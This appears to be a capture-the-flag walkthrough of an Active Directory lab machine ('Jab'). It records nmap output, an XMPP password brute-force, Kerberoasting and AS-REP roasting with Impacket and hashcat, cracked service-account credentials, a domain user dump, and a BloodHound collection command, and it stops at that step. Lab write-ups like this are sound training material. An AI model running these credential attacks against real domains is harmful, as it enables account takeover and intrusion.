# Nmap
```shell
nmap -A 10.10.11.4                     
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-17 15:03 EDT
Stats: 0:01:12 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.95% done; ETC: 15:04 (0:00:00 remaining)
Nmap scan report for 10.10.11.4
Host is up (0.026s latency).
Not shown: 984 closed tcp ports (conn-refused)
PORT     STATE SERVICE             VERSION
53/tcp   open  domain              Simple DNS Plus
88/tcp   open  kerberos-sec        Microsoft Windows Kerberos (server time: 2024-04-17 19:04:25Z)
135/tcp  open  msrpc               Microsoft Windows RPC
139/tcp  open  netbios-ssn         Microsoft Windows netbios-ssn
389/tcp  open  ldap                Microsoft Windows Active Directory LDAP (Domain: jab.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-04-17T19:05:47+00:00; +1m01s from scanner time.
| ssl-cert: Subject: commonName=DC01.jab.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.jab.htb
| Not valid before: 2023-11-01T20:16:18
|_Not valid after:  2024-10-31T20:16:18
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http          Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap            Microsoft Windows Active Directory LDAP (Domain: jab.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.jab.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.jab.htb
| Not valid before: 2023-11-01T20:16:18
|_Not valid after:  2024-10-31T20:16:18
|_ssl-date: 2024-04-17T19:05:47+00:00; +1m02s from scanner time.
3268/tcp open  ldap                Microsoft Windows Active Directory LDAP (Domain: jab.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.jab.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.jab.htb
| Not valid before: 2023-11-01T20:16:18
|_Not valid after:  2024-10-31T20:16:18
|_ssl-date: 2024-04-17T19:05:48+00:00; +1m02s from scanner time.
3269/tcp open  ssl/ldap            Microsoft Windows Active Directory LDAP (Domain: jab.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.jab.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.jab.htb
| Not valid before: 2023-11-01T20:16:18
|_Not valid after:  2024-10-31T20:16:18
|_ssl-date: 2024-04-17T19:05:47+00:00; +1m02s from scanner time.
5222/tcp open  jabber              Ignite Realtime Openfire Jabber server 3.10.0 or later
| ssl-cert: Subject: commonName=dc01.jab.htb
| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
| Not valid before: 2023-10-26T22:00:12
|_Not valid after:  2028-10-24T22:00:12
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     unknown: 
|     stream_id: 5gvwn56smk
|     compression_methods: 
|     capabilities: 
|     xmpp: 
|       version: 1.0
|     features: 
|     errors: 
|       invalid-namespace
|       (timeout)
|_    auth_mechanisms: 
|_ssl-date: TLS randomness does not represent time
5269/tcp open  xmpp                Wildfire XMPP Client
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     unknown: 
|     compression_methods: 
|     capabilities: 
|     xmpp: 
|     features: 
|     errors: 
|       (timeout)
|_    auth_mechanisms: 
7070/tcp open  realserver?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP: 
|     HTTP/1.1 400 Illegal character CNTL=0x0
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x0</pre>
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Wed, 17 Apr 2024 19:04:25 GMT
|     Last-Modified: Wed, 16 Feb 2022 15:55:02 GMT
|     Content-Type: text/html
|     Accept-Ranges: bytes
|     Content-Length: 223
|     <html>
|     <head><title>Openfire HTTP Binding Service</title></head>
|     <body><font face="Arial, Helvetica"><b>Openfire <a href="http://www.xmpp.org/extensions/xep-0124.html">HTTP Binding</a> Service</b></font></body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Wed, 17 Apr 2024 19:04:30 GMT
|     Allow: GET,HEAD,POST,OPTIONS
|   Help: 
|     HTTP/1.1 400 No URI
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 49
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: No URI</pre>
|   RPCCheck: 
|     HTTP/1.1 400 Illegal character OTEXT=0x80
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 71
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character OTEXT=0x80</pre>
|   RTSPRequest: 
|     HTTP/1.1 505 Unknown Version
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 58
|     Connection: close
|     <h1>Bad Message 505</h1><pre>reason: Unknown Version</pre>
|   SSLSessionReq: 
|     HTTP/1.1 400 Illegal character CNTL=0x16
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 70
|     Connection: close
|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x16</pre>
7443/tcp open  ssl/oracleas-https?
| ssl-cert: Subject: commonName=dc01.jab.htb
| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
| Not valid before: 2023-10-26T22:00:12
|_Not valid after:  2028-10-24T22:00:12
|_ssl-date: TLS randomness does not represent time
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP: 
|     HTTP/1.1 400 Illegal character CNTL=0x0
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x0</pre>
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Wed, 17 Apr 2024 19:04:32 GMT
|     Last-Modified: Wed, 16 Feb 2022 15:55:02 GMT
|     Content-Type: text/html
|     Accept-Ranges: bytes
|     Content-Length: 223
|     <html>
|     <head><title>Openfire HTTP Binding Service</title></head>
|     <body><font face="Arial, Helvetica"><b>Openfire <a href="http://www.xmpp.org/extensions/xep-0124.html">HTTP Binding</a> Service</b></font></body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Wed, 17 Apr 2024 19:04:37 GMT
|     Allow: GET,HEAD,POST,OPTIONS
|   Help: 
|     HTTP/1.1 400 No URI
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 49
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: No URI</pre>
|   RPCCheck: 
|     HTTP/1.1 400 Illegal character OTEXT=0x80
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 71
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character OTEXT=0x80</pre>
|   RTSPRequest: 
|     HTTP/1.1 505 Unknown Version
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 58
|     Connection: close
|     <h1>Bad Message 505</h1><pre>reason: Unknown Version</pre>
|   SSLSessionReq: 
|     HTTP/1.1 400 Illegal character CNTL=0x16
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 70
|     Connection: close
|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x16</pre>
7777/tcp open  socks5              (No authentication; connection not allowed by ruleset)
| socks-auth-info: 
|_  No authentication
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port7070-TCP:V=7.94SVN%I=7%D=4/17%Time=66201CFC%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,189,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Wed,\x2017\x20Apr\x
SF:202024\x2019:04:25\x20GMT\r\nLast-Modified:\x20Wed,\x2016\x20Feb\x20202
SF:2\x2015:55:02\x20GMT\r\nContent-Type:\x20text/html\r\nAccept-Ranges:\x2
SF:0bytes\r\nContent-Length:\x20223\r\n\r\n<html>\n\x20\x20<head><title>Op
SF:enfire\x20HTTP\x20Binding\x20Service</title></head>\n\x20\x20<body><fon
SF:t\x20face=\"Arial,\x20Helvetica\"><b>Openfire\x20<a\x20href=\"http://ww
SF:w\.xmpp\.org/extensions/xep-0124\.html\">HTTP\x20Binding</a>\x20Service
SF:</b></font></body>\n</html>\n")%r(RTSPRequest,AD,"HTTP/1\.1\x20505\x20U
SF:nknown\x20Version\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nC
SF:ontent-Length:\x2058\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\
SF:x20505</h1><pre>reason:\x20Unknown\x20Version</pre>")%r(HTTPOptions,56,
SF:"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Wed,\x2017\x20Apr\x202024\x2019:04:
SF:30\x20GMT\r\nAllow:\x20GET,HEAD,POST,OPTIONS\r\n\r\n")%r(RPCCheck,C7,"H
SF:TTP/1\.1\x20400\x20Illegal\x20character\x20OTEXT=0x80\r\nContent-Type:\
SF:x20text/html;charset=iso-8859-1\r\nContent-Length:\x2071\r\nConnection:
SF:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\
SF:x20character\x20OTEXT=0x80</pre>")%r(DNSVersionBindReqTCP,C3,"HTTP/1\.1
SF:\x20400\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Type:\x20text/ht
SF:ml;charset=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\
SF:r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20charact
SF:er\x20CNTL=0x0</pre>")%r(DNSStatusRequestTCP,C3,"HTTP/1\.1\x20400\x20Il
SF:legal\x20character\x20CNTL=0x0\r\nContent-Type:\x20text/html;charset=is
SF:o-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\n\r\n<h1>Ba
SF:d\x20Message\x20400</h1><pre>reason:\x20Illegal\x20character\x20CNTL=0x
SF:0</pre>")%r(Help,9B,"HTTP/1\.1\x20400\x20No\x20URI\r\nContent-Type:\x20
SF:text/html;charset=iso-8859-1\r\nContent-Length:\x2049\r\nConnection:\x2
SF:0close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20No\x20URI</
SF:pre>")%r(SSLSessionReq,C5,"HTTP/1\.1\x20400\x20Illegal\x20character\x20
SF:CNTL=0x16\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nContent-L
SF:ength:\x2070\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</
SF:h1><pre>reason:\x20Illegal\x20character\x20CNTL=0x16</pre>");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port7443-TCP:V=7.94SVN%T=SSL%I=7%D=4/17%Time=66201D02%P=x86_64-pc-linux
SF:-gnu%r(GetRequest,189,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Wed,\x2017\x2
SF:0Apr\x202024\x2019:04:32\x20GMT\r\nLast-Modified:\x20Wed,\x2016\x20Feb\
SF:x202022\x2015:55:02\x20GMT\r\nContent-Type:\x20text/html\r\nAccept-Rang
SF:es:\x20bytes\r\nContent-Length:\x20223\r\n\r\n<html>\n\x20\x20<head><ti
SF:tle>Openfire\x20HTTP\x20Binding\x20Service</title></head>\n\x20\x20<bod
SF:y><font\x20face=\"Arial,\x20Helvetica\"><b>Openfire\x20<a\x20href=\"htt
SF:p://www\.xmpp\.org/extensions/xep-0124\.html\">HTTP\x20Binding</a>\x20S
SF:ervice</b></font></body>\n</html>\n")%r(HTTPOptions,56,"HTTP/1\.1\x2020
SF:0\x20OK\r\nDate:\x20Wed,\x2017\x20Apr\x202024\x2019:04:37\x20GMT\r\nAll
SF:ow:\x20GET,HEAD,POST,OPTIONS\r\n\r\n")%r(RTSPRequest,AD,"HTTP/1\.1\x205
SF:05\x20Unknown\x20Version\r\nContent-Type:\x20text/html;charset=iso-8859
SF:-1\r\nContent-Length:\x2058\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20M
SF:essage\x20505</h1><pre>reason:\x20Unknown\x20Version</pre>")%r(RPCCheck
SF:,C7,"HTTP/1\.1\x20400\x20Illegal\x20character\x20OTEXT=0x80\r\nContent-
SF:Type:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2071\r\nConne
SF:ction:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Il
SF:legal\x20character\x20OTEXT=0x80</pre>")%r(DNSVersionBindReqTCP,C3,"HTT
SF:P/1\.1\x20400\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Type:\x20t
SF:ext/html;charset=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20
SF:close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20c
SF:haracter\x20CNTL=0x0</pre>")%r(DNSStatusRequestTCP,C3,"HTTP/1\.1\x20400
SF:\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Type:\x20text/html;char
SF:set=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\n\r\n
SF:<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20character\x20C
SF:NTL=0x0</pre>")%r(Help,9B,"HTTP/1\.1\x20400\x20No\x20URI\r\nContent-Typ
SF:e:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2049\r\nConnecti
SF:on:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20No\x2
SF:0URI</pre>")%r(SSLSessionReq,C5,"HTTP/1\.1\x20400\x20Illegal\x20charact
SF:er\x20CNTL=0x16\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nCon
SF:tent-Length:\x2070\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x2
SF:0400</h1><pre>reason:\x20Illegal\x20character\x20CNTL=0x16</pre>");
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-04-17T19:05:05
|_  start_date: N/A
|_clock-skew: mean: 1m01s, deviation: 0s, median: 1m01s

```

# The XMPP Service

Download pidgin and register a new user
Once you are in say you are chatty and join the rooms
![[Pasted image 20240417205639.png]]
![[Pasted image 20240417205851.png]]

So we see bdavis is a user. We can brute force. We get a hit with password welcome1

Now in the chats we see this:
```text
(11/21/2023 01:31:13 PM) adunn: team, we need to finalize post-remediation testing from last quarter's pentest. @bdavis Brian can you please provide us with a status?
(11/21/2023 01:33:58 PM) bdavis: sure. we removed the SPN from the svc_openfire account. I believe this was finding #2. can someone from the security team test this? if not we can send it back to the pentesters to validate. 
(11/21/2023 02:30:41 PM) bdavis: here are the commands from the report, can you find someone from the security team who can re-run these to validate? 
(11/21/2023 02:30:43 PM) bdavis: $ GetUserSPNs.py -request -dc-ip 192.168.195.129 jab.htb/hthompson
 
Impacket v0.9.25.dev1+20221216.150032.204c5b6b - Copyright 2021 SecureAuth Corporation
 
Password:
ServicePrincipalName  Name          MemberOf  PasswordLastSet             LastLogon  Delegation 
--------------------  ------------  --------  --------------------------  ---------  ----------
http/xmpp.jab.local   svc_openfire            2023-10-27 15:23:49.811611  <never>               
 
 
 
[-] CCache file is not found. Skipping...
$krb5tgs$23$*svc_openfire$JAB.HTB$jab.htb/svc_openfire*$b1abbb2f4beb2a48e7412ccd26b60e61$864f27ddaaded607ab5efa59544870cece4b6262e20f3bee38408d296ffbf07ceb421188b9b82ac0037ae67b488bb0ef2178a0792d62<SNIP>

(11/21/2023 02:30:56 PM) bdavis: $ hashcat -m 13100 svc_openfire_tgs /usr/share/wordlists/rockyou.txt 

hashcat (v6.1.1) starting...

<SNIP>

$krb5tgs$23$*svc_openfire$JAB.HTB$jab.htb/svc_openfire*$de17a01e2449626571bd9416dd4e3d46$4fea18693e1cb97f3e096288a76204437f115fe49b9611e339154e0effb1d0fcccfbbbb219da829b0ac70e8420f2f35a4f315c5c6f1d4ad3092e14ccd506e9a3bd3d20854ec73e62859cd68a7e6169f3c0b5ab82064b04df4ff7583ef18bbd42ac529a5747102c2924d1a76703a30908f5ad41423b2fff5e6c03d3df6c0635a41bea1aca3e15986639c758eef30b74498a184380411e207e5f3afef185eaf605f543c436cd155823b7a7870a3d5acd0b785f999facd8b7ffdafe6e0410af26efc42417d402f2819d03b3730203b59c21b0434e2e0e7a97ed09e3901f523ba52fe9d3ee7f4203de9e857761fbcb417d047765a5a01e71aff732e5d5d114f0b58a8a0df4ca7e1ff5a88c532f5cf33f2e01986ac44a353c0142b0360e1b839bb6889a54fbd9c549da23fb05193a4bfba179336e7dd69380bc4f9c3c00324e42043ee54b3017a913f84a20894e145b23b440aff9c524efb7957dee89b1e7b735db292ca5cb32cf024e9b8f5546c33caa36f5370db61a9a3facb473e741c61ec7dbee7420c188e31b0d920f06b7ffc1cb86ace5db0f9eeaf8c13bcca743b6bf8b2ece99dd58aff354f5b4a78ffcd9ad69ad8e7812a2952806feb9b411fe53774f92f9e8889380dddcb59de09320094b751a0c938ecc762cbd5d57d4e0c3d660e88545cc96e324a6fef226bc62e2bb31897670929571cd728b43647c03e44867b148428c9dc917f1dc4a0331517b65aa52221fcfe9499017ab4e6216ced3db5837d10ad0d15e07679b56c6a68a97c1e851238cef84a78754ff5c08d31895f0066b727449575a1187b19ad8604d583ae07694238bae2d4839fb20830f77fffb39f9d6a38c1c0d524130a6307125509422498f6c64adc030bfcf616c4c0d3e0fa76dcde0dfc5c94a4cb07ccf4cac941755cfdd1ed94e37d90bd1b612fee2ced175aa0e01f2919e31614f72c1ff7316be4ee71e80e0626b787c9f017504fa717b03c94f38fe9d682542d3d7edaff777a8b2d3163bc83c5143dc680c7819f405ec207b7bec51dabcec4896e110eb4ed0273dd26c82fc54bb2b5a1294cb7f3b654a13b4530bc186ff7fe3ab5a802c7c91e664144f92f438aecf9f814f73ed556dac403daaefcc7081957177d16c1087f058323f7aa3dfecfa024cc842aa3c8ef82213ad4acb89b88fc7d1f68338e8127644cfe101bf93b18ec0da457c9136e3d0efa0d094994e1591ecc4:!@#$%^&*(1qazxsw
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, TGS-REP
Hash.Target......: $krb5tgs$23$*svc_openfire$JAB.HTB$jab.htb/svc_openf...91ecc4
Time.Started.....: Fri Oct 27 15:30:12 2023 (17 secs)
Time.Estimated...: Fri Oct 27 15:30:29 2023 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   873.9 kH/s (10.16ms) @ Accel:64 Loops:1 Thr:64 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 14344385/14344385 (100.00%)
Rejected.........: 0/14344385 (0.00%)
Restore.Point....: 14336000/14344385 (99.94%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: $HEX[2321686f74746965] -> $HEX[042a0337c2a156616d6f732103]
 
Started: Fri Oct 27 15:30:09 2023
Stopped: Fri Oct 27 15:30:29 2023

(11/21/2023 02:31:57 PM) adunn: I'll pass this along and circle back with the group
(11/21/2023 02:32:23 PM) bdavis: perfect, thanks Angela!
(11/21/2023 01:22:55 PM) The topic is: 
```

# SMB
```shell
smbclient -L \\\\10.10.11.4\\NETLOGON -U svc_openfire
Password for [WORKGROUP\svc_openfire]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 




smbclient \\\\10.10.11.4\\SYSVOL -U svc_openfire
Password for [WORKGROUP\svc_openfire]:
Try "help" to get a list of possible commands.
smb: \> DIR
  .                                   D        0  Mon Oct 23 14:07:41 2023
  ..                                  D        0  Mon Oct 23 14:07:41 2023
  jab.htb                            Dr        0  Mon Oct 23 14:07:41 2023


```

# Domain Users
```shell
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[svc_openfire] rid:[0x450]
user:[svc_ldap] rid:[0x451]
user:[avazquez] rid:[0x6b6]
user:[pfalcon] rid:[0x6b7]
user:[fanthony] rid:[0x6b8]
user:[wdillard] rid:[0x6b9]
user:[lbradford] rid:[0x6ba]
user:[sgage] rid:[0x6bb]
user:[asanchez] rid:[0x6bc]
user:[dbranch] rid:[0x6bd]
user:[ccruz] rid:[0x6be]
user:[njohnson] rid:[0x6bf]
user:[mholliday] rid:[0x6c0]
user:[mshoemaker] rid:[0x6c1]
user:[aslater] rid:[0x6c2]
user:[kprentiss] rid:[0x6c3]
user:[gdavis] rid:[0x6c4]
user:[jmcdaniel] rid:[0x6c5]
user:[jjones] rid:[0x6c6]
user:[tgarcia] rid:[0x6c7]
user:[mharrison] rid:[0x6c8]
user:[nhight] rid:[0x6c9]
user:[wbaird] rid:[0x6ca]
user:[mochoa] rid:[0x6cb]
user:[jhopkins] rid:[0x6cc]
user:[hblea] rid:[0x6cd]
user:[cpennington] rid:[0x6ce]
user:[dglen] rid:[0x6cf]
user:[khartsfield] rid:[0x6d0]
user:[rramirez] rid:[0x6d1]
user:[ohafner] rid:[0x6d2]
user:[lmatthews] rid:[0x6d3]
user:[lokeefe] rid:[0x6d4]
user:[rburrows] rid:[0x6d5]
user:[csteele] rid:[0x6d6]
user:[jwallace] rid:[0x6d7]
user:[dlewis] rid:[0x6d8]
user:[jsantiago] rid:[0x6d9]
user:[wshepherd] rid:[0x6da]
user:[sbrown] rid:[0x6db]
user:[jwilson] rid:[0x6dc]
user:[jmay] rid:[0x6dd]
user:[dpayne] rid:[0x6de]
user:[rhester] rid:[0x6df]
user:[emercer] rid:[0x6e0]
user:[dcorner] rid:[0x6e1]
user:[ehoffman] rid:[0x6e2]
user:[ngriffith] rid:[0x6e3]
user:[mlowe] rid:[0x6e4]
user:[ygroce] rid:[0x6e5]
user:[gmccarthy] rid:[0x6e6]
user:[srosario] rid:[0x6e7]
user:[bdavis] rid:[0x6e8]
user:[hsarris] rid:[0x6e9]
user:[adunn] rid:[0x6ea]
user:[mrichardson] rid:[0x6eb]
user:[dpalacios] rid:[0x6ec]
user:[jshay] rid:[0x6ed]
user:[halvarez] rid:[0x6ee]

```

# ASREPRoasting
Targeting the users that do not require Kerberos preauthentication
```shell
GetNPUsers.py jab.htb/ -no-pass -usersfile just_usernames.txt  


$krb5asrep$23$lbradford@JAB.HTB:15d00b3050226d032eb64bc1f159319b$b306d7c41e41c03e3b6df1a747d1f268f9b0471dcf568f03bae8e751801bf5bab813eba600ea1a13998cc37d5cb4295a4dc85abefd681516f81bf7e04d81709fd326448da2c04df7c588c4821605c081a248b56353958855fcb15e4a5ab549db7f4034a1328c88839cc1d4a4bead010fa0d0bd67fd498380f57b28a2234f1dcc3f45d861cf6eb09c00b4c8b2fcec54b52bad807b447f3c55e428d459bf05c1707bafb89f649a108f4a2d90bb5f4909bb31123e4771a903aa64cdad87633b92ec96c345c35ff4adb8427c72a46ab6759c3cedcd825a08c76c25e8019899e4f0be8697
$krb5asrep$23$mlowe@JAB.HTB:7c4abae1dc32f4d82fdbd36c7f392fb3$017185f012c90421db511998d931a1f9577fff025cbebbdf766e134162fcd011f621c6ab32a55c8a228a3e5b42ad8a2b95914039ad9a4b706109d513041a7b66988bff1b9aa4d71dea67b48395b4bc00bf306098d967180149520c95e92a8ac34967df7bdb53eeca8db0982dd1265dba1114fd60bcb274ee587f2c323dc6ac0772ceb8536cd3a4c95b868deff0cc826f44a5e84aa7939407a918b4ecd94b0a5981bdd29e6dc06a29a2747afde9ce12e76469551a9187a49817d37d6af6c89d8230b683f92f5bf924b1297f57963a079be64ca33a58872e84b4ebd29f05dc771f2fe5
$krb5asrep$23$jmontgomery@JAB.HTB:666bae082e31a5ca9f7d95e2d23721ad$3b4097e08690dc8cbdc9a9abeafdcc727392370d4125a1e64bc8844e615fc194f7b9a360f16bcbf5229126b1d58a7e178ffa9bf0e5f40eedc409e5ae4c0c47357106286d8d5a4831ba7f2c9395b2f816bb171c89afa583fd4c4f6a56361c9836b15486f2a210dacf39ef344b8fe887c14d7b8bd7cfed885d7854c23b8306dad3003997725ae228f72404952648dcf961c3675383b495396d8d4757fd1a1cc02d5ef4dc5959f900ef2dfbd9ae790ce78903bb0597f4c21ef97f80cb1a88a5eb78c75579518f452a328371389b016591e67c3a66aec953cb9b299f6d99a2c195d0c30d



```

# Enumeration with bloodhound
```shell
bloodhound-python -u 'svc_openfire' -p '!@#$%^&*(1qazxsw' -d jab.htb -dc DC01.jab.htb -c all -ns 10.10.11.4
```